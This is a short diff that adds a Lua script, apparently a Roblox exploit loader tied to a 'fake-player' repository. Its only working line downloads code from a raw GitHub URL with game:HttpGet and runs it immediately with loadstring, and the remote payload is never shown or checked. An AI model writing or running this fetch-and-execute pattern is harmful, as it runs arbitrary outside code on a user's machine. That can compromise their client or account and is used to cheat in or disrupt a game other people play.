@@ -1,0 +1,2 @@
+local user = ""
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CrystalzzDev/fake-player-/main/dont%20use%20this"))()
